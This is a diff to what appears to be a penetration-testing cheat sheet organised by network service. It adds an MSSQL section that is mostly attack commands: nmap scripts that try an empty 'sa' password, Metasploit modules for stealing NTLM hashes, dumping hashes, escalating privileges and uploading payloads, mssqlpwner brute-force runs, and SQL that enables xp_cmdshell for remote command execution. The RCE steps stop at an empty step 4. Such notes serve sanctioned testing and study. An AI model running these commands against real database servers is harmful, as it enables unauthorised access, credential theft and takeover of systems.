@@ -44,6 +44,8 @@ telnet <IP> <PORT>
 ```
 >[!NOTE]
 >This service has been replaced by SSH (22) due to lack of encryption (Telnet transmitts data in plaintext).
+# RPC (135) 
+
 # SMB (137,138,139,445)
 Originally designed to operate on NetBIOS over TCP/IP (NBT) and uses port 139 for session services port 138 for datagram services, and 137 for name services.
 ## SMB 1.0 Name Services (137)
@@ -137,8 +139,113 @@ rsync --list-only <USER@><IP>::<SHARE>
 rsync <USER@><IP>::<SHARE>/<FILE> <FILE>
 ### List all 
 
+# MSSQL (1433)
+Microsoft SQL Server  is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications.
+## Default MS-SQL System Tables
+- **master** Database: This database captures all system-level details for a SQL Server instance.
+- **msdb** Database: SQL Server Agent utilizes this database to manage scheduling for alerts and jobs.
+- **model** Database: Acts as a blueprint for every new database on the SQL Server instance, where any alterations like size, collation, recovery model, and more are mirrored in newly created databases.
+- **Resource** Database: A read-only database that houses system objects that come with SQL Server. These objects, while stored physically in the Resource database, are logically presented in the sys schema of every database.
+- **tempdb** Database: Serves as a temporary storage area for transient objects or intermediate result sets.
+## Automatic Enumeration
+### No Credentials
+Nmap:
+```bash
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+```
+Metasploit:
+```bash
+msf> use auxiliary/scanner/mssql/mssql_ping
+```
+### With Credentials
+```bash
+#Set USERNAME, RHOSTS and PASSWORD
+#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used
+
+#Steal NTLM
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
+
+#Info gathering
+msf> use admin/mssql/mssql_enum #Security checks
+msf> use admin/mssql/mssql_enum_domain_accounts
+msf> use admin/mssql/mssql_enum_sql_logins
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/scanner/mssql/mssql_hashdump
+msf> use auxiliary/scanner/mssql/mssql_schemadump
+
+#Search for insteresting data
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/admin/mssql/mssql_idf
+
+#Privesc
+msf> use exploit/windows/mssql/mssql_linkcrawler
+msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
+msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
+
+#Code execution
+msf> use admin/mssql/mssql_exec #Execute commands
+msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
+
+#Add new admin user from meterpreter session
+msf> use windows/manage/mssql_local_auth_bypass
+```
+## Manual Enumeration
+### Login
+MSSQLPwner
+```bash
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+```
+### Impacket's mssqlclient.py
+```bash
+# Using Impacket mssqlclient.py
+mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
+## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
+mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
+```
+### Sqsh
+```bash
+# Using sqsh
+sqsh -S <IP> -U <Username> -P <Password> -D <Database>
+## In case Windows Auth using "." as domain name for local user
+sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> 
+## In sqsh you need to use GO after writting the query to send it
+1> select 1;
+2> go
+```
+## Gaining RCE After Initial Foothold
+1. Check if user is sysadmin (1:yes, 0:no)
+```SQL
+SELECT is_srvrolemember('sysadmin');
+```
+2. Check if xp_cmdshell is already activated
+```SQL
+EXEC xp_cmdshell 'net user';
+```
+3. Active xp_cmdshell (if needed)
+```SQL
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+4. 
 # MQTT (1883)
 Message Queuing Telemetry Transport 
+
 
 
 
